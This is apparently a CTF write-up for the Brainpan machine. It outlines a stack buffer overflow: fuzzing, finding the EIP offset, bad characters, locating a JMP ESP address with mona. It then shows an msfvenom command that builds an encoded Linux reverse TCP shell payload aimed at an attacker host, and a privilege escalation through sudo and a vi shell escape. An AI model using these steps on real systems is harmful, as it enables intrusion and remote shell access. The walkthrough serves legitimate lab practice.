# brainpan_buffer_overflow
this is a very good ctf to understand linux and windows both stack based bufferoverflow

1. use fuzze .py  --  get size where it creashes
2. create pattern --> pattern_create -l 600
3. get the eip from immunity -- 72413372 
4.  use pattern_offset with -l 600 -q 72413372 -- 520
5. fire bad chars to find what is working inside
6. open mona modules : - !mona modules  - download mona and paste in .wine/drive_c/program file x86/immuntity/pycommands

check out our file is having protections or not if not then pic the address

7. find address --
 Address=0BADF00D
 Message= 0x31170000 | 0x31176000 | 0x00006000 | False  | False   | False |  False   | False  | -1.0- [brainpan.exe] (Z:\root\Downloads\brainpan.exe)

8. open nasm shell - JMP ESP -- FFE4

9. find JMP ESp in mona -- !mona find -s “\xff\xe4” -m modules if it is not working then

close the mona modules and in immuntity go to view execcutables modules -- right click on the module and click on dump data in cpu then press ctrl +f and type JMP ESP

whoop! we go the address --  311712F3   . FFE4           JMP ESP

use these exploits 


#msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.31.148 LPORT=1337 -f c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai


you got  a kali shell perfect  coz i am running the downloaded exe in my kali . now its time to execute it on the actual target 

now change the address of breainpain machine as 192.168.31.149

send you got a shell but not first time with nc 

so try multi handler 
( protip : -- its allowed in OSCP if you are in fear not to use only meterperter is used at once -- other wise multihandler , msfvenom , auxilary you can use,also scripts )


type sudo -l 

use command manual vi 
!bin/bash 

---------------------------------------

boom !!! 

it also contains a linux bof so i will upload it in my blog 

-----

i will also uploadloading the entire process at my blog - https://blog.certcube.com

regards,
Naresh
